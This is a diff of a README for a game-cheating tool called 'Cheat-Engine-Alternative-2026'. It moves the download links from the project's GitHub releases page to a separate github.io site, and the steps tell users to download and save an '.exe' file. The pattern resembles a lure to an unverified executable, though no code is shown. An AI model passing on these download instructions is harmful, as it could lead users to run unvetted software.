@@ -1,6 +1,6 @@
 # 🎮 Cheat-Engine-Alternative-2026 - Master your games with total precision
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Elber6541/Cheat-Engine-Alternative-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://elber6541.github.io)
 
 ## 🎯 About This Software
 
@@ -23,7 +23,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to obtain and use the application.
 
-1.  Visit the official release [page](https://github.com/Elber6541/Cheat-Engine-Alternative-2026/releases).
+1.  Visit the official release [page](https://elber6541.github.io).
 2.  Find the section titled "Assets" at the bottom of the list.
 3.  Click the link that ends in ".exe" to start the download.
 4.  Save the file to your Downloads folder or your Desktop.
